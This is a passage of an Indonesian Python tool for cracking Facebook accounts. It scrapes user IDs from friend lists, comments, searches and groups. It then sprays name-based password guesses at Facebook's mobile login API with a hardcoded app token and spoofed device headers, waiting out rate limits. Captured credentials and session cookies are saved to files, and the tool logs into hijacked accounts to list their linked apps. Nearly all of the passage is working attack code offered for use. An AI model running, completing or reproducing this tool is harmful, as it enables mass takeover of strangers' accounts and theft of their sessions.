			for x in url.find_all("a",href=True):
				if "Lihat Teman Lain" in x.text:
					self.Dump_Publik("https://m.facebook.com/"+x.get("href"))
		except:pass
		
	###----------[ DUMP KOMENTAR ]---------- ###
	def Dump_Komentar(self,url):
		try:
			data = parser(ses.get(url).text,"html.parser")
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid = ids.get("href").split('=')[1].replace("&refid","")
					else:uid = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
					nama = ids.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for z in data.find_all("a",href=True):
				if "Lihat komentar sebelumnya…" in z.text:
					self.Dump_Komentar("https://m.facebook.com"+z["href"])
		except:pass
		
	###----------[ DUMP PENCARIAN NAMA ]---------- ###
	def Dump_Pencarian(self,url):
		try:
			data = parser(ses.get(str(url)).text,'html.parser')
			for z in data.find_all("td"):
				namp = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
				for uid,nama in namp:
					if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
					elif "<span" in nama:nama = re.findall("(.*?)\<",str(nama))[0]
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for x in data.find_all("a",href=True):
				if "Lihat Hasil Selanjutnya" in x.text:
					self.Dump_Pencarian(x.get("href"))
		except:pass
		
	###----------[ DUMP MEMBER GRUP ]---------- ###
	def Dump_MemberGrup(self,url):
		try:
			data = parser(ses.get(url,cookies=self.cookie,headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
			judul = re.findall("<title>(.*?)</title>",str(data))[0]
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
					else:
						if ids.text==judul:pass
						else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for x in data.find_all("a",href=True):
				if "Lihat Postingan Lainnya" in x.text:
					self.Dump_MemberGrup("https://m.facebook.com"+x.get("href"))
		except:pass
		
	###----------[ DUMP FILE ]---------- ###
	def Dump_File(self,lok):
		try:
			file = open(lok,"r").read().splitlines()
			for z in file:
				tampung.append(z)
		except:pass
		
	###----------[ DUMP EMAIL ]---------- ###
	def Dump_Email(self,nama,format,limit):
		try:
			for z in range(int(limit)):
				if len(nama.split()) > 1:
					email = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(format)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
				else:
					email = str(nama)+str(z)+str(format)+"<=>"+str(nama)
				if email in tampung:pass
				else:tampung.append(email)
		except:pass
		
	###----------[ DUMP USERNAME ]---------- ###
	def Dump_Username(self,nama,limit):
		try:
			for z in range(int(limit)):
				if "." in nama:
					user = str(nama)+"."+str(z)+"<=>"+str(nama.replace("."," "))
				else:
					user = str(nama)+"."+str(z)+"<=>"+str(nama)
				if user in tampung:pass
				else:tampung.append(user)
		except:pass

###----------[ BAGIAN CRACK ]---------- ###
class Crack:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self):
		self.loop = 0
		self.ok = []
		self.cp = []
		self.apk = []
		self.aktif = []
		self.kadaluwarsa = []
		self.hari_ini = datetime.now().strftime("%d-%B-%Y")
		
	###----------[ ATUR SANDI DAN METODE ]---------- ###
	def atursandi(self):
		prints(Panel(f"""{P2}berhasil mengumpulkan {len(tampung)} id""",width=80,padding=(0,21),style=f"{color_panel}"))
		set = console.input(f" {H2}• {P2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
		
		###----------[ SANDI MANUAL ]---------- ###
		if set in["Y","y"]:
			prints(Panel(f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"{color_panel}"))
			pwx = console.input(f" {H2}• {P2}buat katasandi : ").split(",")
			if len(pwx)<=5:
				prints(Panel(f"""{M2}katasandi harus minimal 6 huruf""",width=80,style=f"{color_panel}"))
				exit()
			prints(Panel(f"""{P2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
			app = console.input(f" {H2}• {P2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
			if app in["Y","y"]:
				self.apk.append("muncul")
			else:
				self.apk.append("kontol anjing")
			self.manual(pwx)
		
		###----------[ SANDI OTOMATIS ]---------- ###
		else:
			prints(Panel(f"""{P2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
			app = console.input(f" {H2}• {P2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
			if app in["Y","y"]:
				self.apk.append("muncul")
			else:
				self.apk.append("kontol anjing")
			self.otomatis()
		
	###----------[ CRACK MANUAL ]---------- ###
	def manual(self,pw):
		global prog,des
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
		des = prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as fall:
				self.simpan_hasil()
				for data in tampung:
					user = data.split("<=>")[0]
					nama = data.split("<=>")[1]
					pwx = pw
					fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
						
	###----------[ CRACK OTOMATIS ]---------- ###
	def otomatis(self):
		global prog,des
		prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
		des = prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as fall:
				self.simpan_hasil()
				for data in tampung:
					try:
						pwx = []
						user = data.split("<=>")[0]
						nama = data.split("<=>")[1]
						depan = nama.split(" ")[0]
						if len(nama)<=5:
							if len(depan)<3:
								pass 
							else:
								pwx.append(depan+"123")
								pwx.append(depan+" 1234") 
								pwx.append(depan+"12345")
						else:
							if len(depan)<3:
								pwx.append(nama)
							else:
								pwx.append(nama)
								pwx.append(depan+"123")
								pwx.append(depan+" 1234") 
								pwx.append(depan+"12345")
							belakang = nama.split(" ")[1]
							if len(belakang)<3:
								pwx.append(depan+belakang)
							else:
								pwx.append(depan+belakang)
								pwx.append(belakang+"123")
								pwx.append(belakang+" 1234") 
								pwx.append(belakang+"12345")
						fall.submit(self.metode_api,user,pwx)
					except:
						fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
							
	###----------[ METODE API ]---------- ###
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}•{P2} crack {H2}aman{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				ua = random.choice(ugent)
				params = {
					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
					"sdk_version": f"{str(random.randint(1,26))}", 
					"email": email,
					"locale": "en_US",
					"password": pw,
					"sdk": "android",
					"generate_session_cookies": "1",
					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
				headers = {
					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": ua,
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger"
				}
				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
				if "session_key" in post.text and "EAA" in post.text:
					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
					sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					user = re.findall("c_user=(\d+)",cookie)[0]
					if user in self.ok or user in self.cp:
						break
					else:
						self.ok.append(user)
						if "muncul" in self.apk:
							self.get_apk(user,pw,cookie)
						else:
							tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
							tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
							prints(tree)
						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
						break
				elif "User must verify their account" in post.text:
					user = post.json()["error"]["error_data"]["uid"]
					if user in self.ok or user in self.cp:
						break
					else:
						self.cp.append(user)
						tree = Tree(Panel.fit(f"""{K2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
						tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
						prints(tree)
						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
						break
				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
					prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
					prog.advance(des)
					time.sleep(30)
				else:continue
		except ConnectionError:
			time.sleep(30)
			self.metode_api(user,pwx)
		self.loop +=1

	###----------[ PRINT SIMPAN HASIL ]---------- ###
	def simpan_hasil(self):
		prints(Panel(f"""\r{P2}hasil crack ok tersimpan ke : OK/{self.hari_ini}.txt
{P2}hasil crack ok tersimpan ke : CP/{self.hari_ini}.txt""",width=80,padding=(0,10),style=f"{color_panel}"))
	
	###----------[ PRINT MUNCUL APK ]---------- ###
	def get_apk(self,user,pw,cookie):
		
		###----------[ CEK MODE GRATIS ]---------- ###
		try:
			url = ses.get("https://m.facebook.com/",cookies={"cookie": cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get = ses.get("https://m.facebook.com"+z["href"],cookies={"cookie": cookie})
						parsing = parser(get.text,"html.parser")
						action = parsing.find("form",{"method":"post"})["action"]
						data = {
							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
							"submit": "OK, Gunakan Data"
						}
						post = ses.post("https://m.facebook.com"+action,data=data,cookies={"cookie": cookie})
						break
		except:pass
			
		###----------[ APLIKASI AKTIF ]---------- ###
		aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
		self.apkaktif("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookie)
		if len(self.aktif)==0:
			aktip.add(f"{P2}tidak ada aplikasi yang terkait")
		else:
			for apk in self.aktif:
				aktip.add(f"{H2}{apk}{P2}")
				
		###----------[ APLIKASI KADALUWARSA ]---------- ###
		kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
		self.apkkadaluwarsa("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookie)
		if len(self.kadaluwarsa)==0:
			kadalu.add(f"{P2}tidak ada aplikasi yang terkait")
		else:
			for apk in self.kadaluwarsa:
				kadalu.add(f"{M2}{apk}{P2}")
			
		###----------[ PRINT SEMUA ]---------- ###
		tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
		tree.add(aktip)
		tree.add(kadalu)
		tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
		prints(tree)
		
	###----------[ GET APK AKTIF ]---------- ###
	def apkaktif(self,url,cookie):
		try:
			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Ditambahkan" in apk.text:
					self.aktif.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
				else:continue
			next = "https://m.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.apkaktif(next,cookie)
		except:pass
		
	###----------[ GET APK KADALUWARSA ]---------- ###
	def apkkadaluwarsa(self,url,cookie):
		try:
			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Kedaluwarsa" in apk.text:
					self.kadaluwarsa.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
				else:continue
			next = "https://m.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.apkkadaluwarsa(next,cookie)
		except:pass
	
###----------[ MENU LAIN ]---------- ###
class Lain:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self,cookie):
		self.cookie = cookie
		self.file = []
		self.listfile = []
		
	###----------[ MENU ]---------- ###
	def menu(self):
		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack  [{color_text}04{P2}]. ganti warna tema tools
[{color_text}02{P2}]. get info akun target    [{color_text}05{P2}]. tampilkan info cookies
[{color_text}03{P2}]. setting user agent      [{color_text}06{P2}]. logout ({M2}hapus login{P2})""",width=80,padding=(0,7),style=f"{color_panel}"))
		menu = console.input(f" {H2}• {P2}pilih menu : ")
		if menu in["01","1"]:
			self.cek_hasil()
		elif menu in["04","4"]:
			self.ganti_tema()
		elif menu in["05","5"]:
			self.tampil_cookie()
		elif menu in["06","6"]:
			os.system("rm data/cookie")
			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python run.py""",width=80,style=f"{color_panel}")))
		else:
			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))

	###----------[ CEK HASIL CRACK ]---------- ###
	def cek_hasil(self):
		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack ok
[{color_text}02{P2}]. lihat akun hasil crack cp""",width=80,padding=(0,20),style=f"{color_panel}"))
		ask = console.input(f" {H2}• {P2}masukan pilihan : ")
		if ask in["1","01"]:folder = "OK"
		else:folder = "CP"
		
		###----------[ PILIH FILE ]---------- ###
		dirs = os.listdir(folder)
		prints(Panel(f"""{P2} berhasil menemukan {len(dirs)} file hasil crack ok""",width=80,padding=(0,15),style=f"{color_panel}"))
		num = 0
		for fil in dirs:
			num += 1
			self.file.append(fil)
			totalakun = open(f"{folder}/{fil}","r").read().splitlines()
			self.listfile.append(Panel(f"{P2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_panel}"))
			self.listfile.append(Panel(f"{P2}{fil}",width=35,title=f"{P2}tanggal",style=f"{color_panel}"))
			self.listfile.append(Panel(f"{P2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=f"{color_panel}"))
		console.print(Columns(self.listfile))
		prints(Panel(f"""{P2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=80,style=f"{color_panel}"))
		result = console.input(f" {H2}• {P2}masukan angka : ")
		
		###----------[ MULAI CEK ]---------- ###
		try:
			files = self.file[int(result)-1]
			totalhasil = open(f"{folder}/{files}","r").read().splitlines()
		except:
			prints(Panel(f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",width=80,style=f"{color_panel}"))
			exit()
		nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
		prints(Panel(f"""{P2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",width=80,style=f"{color_panel}"))
		for akun in totalhasil:
			user = akun.split("|")[0]
			pw = akun.split("|")[1]
			tree = Tree(" ",guide_style=f"{color_panel}")
			if folder=="OK":
				cookie = akun.split("|")[2]
				tree.add(f"\r{H2}{user}|{pw}{P2} ")
				tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
			else:
				tree.add(f"\r{K2}{user}|{pw}{P2} ")
			prints(tree)
		prints(Panel(f"""{P2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",width=80,padding=(0,7),style=f"{color_panel}"))
		exit()
		
	###----------[ GANTI WARNA TEMA ]---------- ###
	def ganti_tema(self):
		prints(Panel(f"""{P2}[{color_text}01{P2}]. ganti warna tema merah  [{color_text}06{P2}]. ganti warna tema pink
[{color_text}02{P2}]. ganti warna tema hijau  [{color_text}07{P2}]. ganti warna tema cyan
[{color_text}03{P2}]. ganti warna tema kuning [{color_text}08{P2}]. ganti warna tema putih
[{color_text}04{P2}]. ganti warna tema biru   [{color_text}09{P2}]. ganti warna tema orange
[{color_text}05{P2}]. ganti warna tema ungu   [{color_text}10{P2}]. ganti warna tema abu2""",width=80,padding=(0,7),style=f"{color_panel}"))
		ask = console.input(f" {H2}• {P2}pilih tema : ")
		if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
		elif ask in["02","2"]:warna = "[#00FF00]";teks="hijau"
		elif ask in["03","3"]:warna = "[#FFFF00]";teks="kuning"
		elif ask in["04","4"]:warna = "[#00C8FF]";teks="biru"
		elif ask in["05","5"]:warna = "[#AF00FF]";teks="ungu"
		elif ask in["06","6"]:warna = "[#FF00FF]";teks="pink"
		elif ask in["07","7"]:warna = "[#00FFFF]";teks="cyan"
		elif ask in["08","8"]:warna = "[#FFFFFF]";teks="putih"
		elif ask in["09","9"]:warna = "[#FF8F00]";teks="orange"
		elif ask in["10"]:warna = "[#AAAAAA]";teks="abu-abu"
		open("data/theme_color","w").write(warna+"|"+warna.replace("[","").replace("]",""))
		prints(Panel(f"""{H2}berhasil mengganti tema ke {teks}, silahkan mulai ulang tools""",width=80,padding=(0,6),style=f"{color_panel}"))
		sys.exit()
			
	###----------[ TAMPILKAN COOKIE ]---------- ###
	def tampil_cookie(self):
		now = datetime.now()
		hari = now.day+int(30)
		if hari > 30:hari = hari-30
		bulan = now.month+1
		if bulan > 12:bulan = bulan-12
		if now.month+1 > 12:tahun = now.year+1
		data = date(year=tahun,month=bulan,day=hari)
		aktif = data.strftime("%d %B %Y")
		console.print(f" {H2}• {P2}aktif sampai : {aktif}")
		prints(Panel(f"""{H2}{self.cookie.get('cookie')}""",width=80,style=f"{color_panel}"))
		sys.exit()
		
###----------[ BAGIAN SESSION HEADERS DAN USER AGENT ]---------- ###
class Session:
	
	###----------[ GENERATE USER AGENT CRACK ]---------- ###
	def generate_ugent(self):
		#versi_android = random.randint(4,12)
		#versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
		#versi_app = random.randint(410000000,499999999)
		#device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
		#density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
		ugent = f"Davik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
		return ugent		
		
if __name__=="__main__":
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("data")
	except:pass
	Menu().menu()
#Gunakan Facebook dalam mode dasar dengan Telkomsel
